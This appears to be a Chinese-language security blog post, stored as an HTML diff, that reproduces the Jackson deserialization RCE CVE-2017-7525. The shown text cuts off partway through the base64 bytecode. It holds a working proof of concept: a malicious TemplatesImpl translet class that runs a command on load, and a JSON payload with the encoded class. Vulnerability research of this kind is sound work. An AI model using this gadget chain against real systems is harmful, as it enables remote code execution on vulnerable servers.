@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/null">
+    <link rel="icon" type="image/png" href="/null">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>Jackson 反序列化 RCE - Hexo</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content="">
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: #f4f4f4;
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html,body{
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    overflow-y: overlay;
+}
+body{
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">归档</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/about/" class="button">
+			<div class="navbar-menu">关于</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">归档</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/about/" class="dropdown-menu button">关于</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>Jackson 反序列化 RCE</h3>
+    
+      <span class="post-meta-label">
+        John Doe
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-09-18 22:26" pubdate>
+          2022-09-18
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 3.2k 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7525"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-7525</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88TemplatesImpl-%E9%93%BE%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞复现（TemplatesImpl 链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">POC 调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-17485"><span class="toc-number">2.</span> <span class="toc-text">CVE-2017-17485</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">补丁绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95-1"><span class="toc-number">2.3.</span> <span class="toc-text">POC 调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c3p0%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">c3p0利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-5968"><span class="toc-number">3.</span> <span class="toc-text">CVE-2018-5968</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">3.2.</span> <span class="toc-text">补丁绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E8%B0%83%E8%AF%95-2"><span class="toc-number">3.3.</span> <span class="toc-text">POC 调试</span></a></li></ol></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><p><strong>影响版本</strong></p>
+<ul>
+<li>Jackson 2.6系列 &lt; 2.6.7.1</li>
+<li>Jackson 2.7系列 &lt; 2.7.9.1</li>
+<li>Jackson 2.8系列 &lt; 2.8.8.1</li>
+</ul>
+<p><strong>环境搭建</strong><br>我用的是 JDK 8u20，对 JDK 的版本要求比较不确定，网上大部分人用 7u21 能复现，但是我的不行，得自己多试试。</p>
+<p>导入依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现（TemplatesImpl-链）"><a href="#漏洞复现（TemplatesImpl-链）" class="headerlink" title="漏洞复现（TemplatesImpl 链）"></a>漏洞复现（TemplatesImpl 链）</h3><p>这里直接贴 POC，和 Fastjson 的 TemplatesImpl 链差不多，直接看能看懂。</p>
+<p>构造一个恶意类，继承 AbstractTranslet（在 Fastjson 里说过原因）；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将恶意类的字节码进行 base64 编码；</p>
+<p>定义一个实体类，其中包含一个<code>Object</code>属性；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User getObject()......&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User setObject()......&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User getName()......&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User setName()......&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User getAge()......&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User setAge()......&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, object=&quot;</span> + object +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类构造 POC；<br>在 User 类的<code>object</code>属性中指明该属性类的全类名，并且给其相应的变量赋值，<code>transletBytecodes</code>是恶意类的字节码进行 base64 编码后的值；<br>设置 DefaultTyping 为默认值，即 OBJECT_AND_NON_CONCRETE；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonPoc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;blckder02\&quot;,\&quot;age\&quot;:21,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;object\&quot;:[&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#123;\&quot;transletBytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEV2aWxUZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQANRXZpbFRlc3QuamF2YQwABwAIBwAnDAAoACkBAAhjYWxjLmV4ZQwAKgArAQAIRXZpbFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAALAAQADAANAA0ACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAE